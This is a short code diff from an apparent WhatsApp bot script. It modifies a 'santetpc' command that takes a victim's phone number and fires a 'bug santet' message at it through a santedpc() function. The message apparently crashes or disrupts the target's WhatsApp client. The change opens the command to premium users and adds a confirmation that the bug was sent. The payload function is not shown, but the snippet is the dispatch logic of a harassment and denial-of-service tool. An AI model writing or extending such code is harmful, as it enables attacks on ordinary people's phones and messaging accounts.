@@ -677,10 +677,11 @@ XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.i
 }
 break
 case 'santetpc': {
-if (!itsMeKayla) return reply(mess.owner)
+if (!isPremium && !isCreator) return reply(mess.premi)
 if (!q) return reply(`Contoh ${command} 6281297970769`)
 nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 if (Input == isCreator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
+reply(`Bug Santet Telah Dikirim Ke: *${text}*`)
 santedpc(bygbt, nmn, sleep)
 }
 break
